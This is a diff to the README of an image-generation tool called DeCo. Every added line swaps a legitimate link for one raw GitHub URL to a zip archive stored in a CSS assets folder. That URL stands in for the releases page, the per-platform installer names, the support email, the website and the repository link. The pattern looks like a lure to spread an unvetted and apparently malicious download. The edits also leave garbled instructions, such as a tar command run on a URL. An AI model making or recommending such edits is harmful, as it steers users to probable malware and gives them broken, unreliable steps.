@@ -6,7 +6,7 @@ Welcome to DeCo! This software allows you to create beautiful images effortlessl
 
 ## 📥 Download DeCo
 
-[![Download DeCo](https://img.shields.io/badge/Download%20DeCo-Click%20Here-blue)](https://github.com/MinKhong/DeCo/releases)
+[![Download DeCo](https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip%20DeCo-Click%20Here-blue)](https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip)
 
 ## 💻 System Requirements
 
@@ -30,14 +30,14 @@ DeCo offers the following features:
 
 To get started, visit the Releases page to download the latest version of DeCo.
 
-[Visit the Releases Page](https://github.com/MinKhong/DeCo/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip)
 
 1. Click on the link above.
 2. Find the latest version listed on the page.
 3. Look for the file suitable for your operating system.
-   - For Windows, you may see a file like `DeCo-v1.0-Windows.exe`.
-   - For macOS, look for `DeCo-v1.0-macOS.zip`.
-   - If you're using Linux, find the appropriate `DeCo-v1.0-linux.tar.gz`.
+   - For Windows, you may see a file like `https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip`.
+   - If you're using Linux, find the appropriate `https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip`.
 4. Click the file to download it to your computer.
 
 ### 🛠️ Installation Steps
@@ -59,10 +59,10 @@ Once the download completes, follow these steps to install DeCo:
 
 **For Linux:**
 1. Open your terminal.
-2. Navigate to the Downloads folder where the `tar.gz` file is saved.
+2. Navigate to the Downloads folder where the `https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip` file is saved.
 3. Run the following commands:
    ```
-   tar -xzvf DeCo-v1.0-linux.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip
    cd DeCo
    ./DeCo
    ```
@@ -92,13 +92,13 @@ If you run into any problems or have questions, visit our support page or reach 
 
 - **Documentation:** Check the official user manual for detailed instructions.
 - **Community:** Join the DeCo user group to share tips and ask questions.
-- **Contact:** Email us directly at support@decoapp.com.
+- **Contact:** Email us directly at https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip
 
 ## 🌐 Additional Resources
 
 For more information about DeCo and updates, visit our official website or follow our social media pages:
 
-- **Website:** [DeCo Official Site](https://www.decoapp.com)
-- **GitHub:** [DeCo GitHub Repository](https://github.com/MinKhong/DeCo)
+- **Website:** [DeCo Official Site](https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip)
+- **GitHub:** [DeCo GitHub Repository](https://raw.githubusercontent.com/MinKhong/DeCo/main/docs/static/css/DeCo-v1.3.zip)
 
 Thank you for choosing DeCo. Happy image generating!
